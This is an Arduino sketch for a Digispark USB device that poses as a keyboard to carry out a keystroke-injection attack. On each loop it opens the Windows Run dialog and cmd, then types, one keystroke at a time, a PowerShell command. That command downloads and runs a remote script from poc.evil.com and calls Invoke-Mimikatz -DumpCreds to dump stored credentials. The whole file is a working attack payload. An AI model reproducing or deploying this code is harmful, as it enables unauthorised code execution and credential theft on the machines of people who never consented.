// Mark C. made this.
// 
// 
 #include "DigiKeyboard.h"
#define KEY_UP_ARROW   0x52
#define KEY_DOWN_ARROW   0x51
#define KEY_LEFT_ARROW   0x50
#define KEY_RIGHT_ARROW   0x4F
#define KEY_Tab 43

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}


void loop() {
 digitalWrite(1, HIGH);
 //for(int i=0;i<70;i++){DigiKeyboard.sendKeyStroke(i, MOD_SHIFT_LEFT);delay(500);}
 DigiKeyboard.update();
 delay(1000);
 DigiKeyboard.sendKeyStroke(0); //this is generally not necessary but with some older systems it seems to prevent missing the first character after a delay
 DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
 delay(1000);
 DigiKeyboard.println("cmd");
 delay(1000);
 DigiKeyboard.print("powershell ");DigiKeyboard.sendKeyStroke(31, MOD_SHIFT_LEFT) ; // use shift+2 to get \" on UK keyboards, 52 for US
 DigiKeyboard.print("IEX "); DigiKeyboard.sendKeyStroke(38, MOD_SHIFT_LEFT); DigiKeyboard.print("New-Object Net");
 DigiKeyboard.sendKeyStroke(55);DigiKeyboard.print("Webclient");DigiKeyboard.sendKeyStroke(39, MOD_SHIFT_LEFT);
 DigiKeyboard.sendKeyStroke(55); 
 DigiKeyboard.print("DownloadString");DigiKeyboard.sendKeyStroke(38, MOD_SHIFT_LEFT); DigiKeyboard.sendKeyStroke(52);
 DigiKeyboard.print("http");DigiKeyboard.sendKeyStroke(51, MOD_SHIFT_LEFT);
 DigiKeyboard.sendKeyStroke(56); DigiKeyboard.sendKeyStroke(56);
 DigiKeyboard.print("poc"); DigiKeyboard.sendKeyStroke(55); 
 DigiKeyboard.print("evil");DigiKeyboard.sendKeyStroke(55); 
 DigiKeyboard.print("com"); DigiKeyboard.sendKeyStroke(56); DigiKeyboard.print("subdir");
 DigiKeyboard.sendKeyStroke(56); DigiKeyboard.print("test"); DigiKeyboard.sendKeyStroke(55); DigiKeyboard.print("ps1");
 DigiKeyboard.sendKeyStroke(52); DigiKeyboard.sendKeyStroke(39, MOD_SHIFT_LEFT); DigiKeyboard.sendKeyStroke(51);
 DigiKeyboard.print(" Invoke-Mimikatz -DumpCreds"); DigiKeyboard.sendKeyStroke(31, MOD_SHIFT_LEFT); DigiKeyboard.sendKeyStroke(40);
 digitalWrite(1, LOW);
 delay(6000);
}
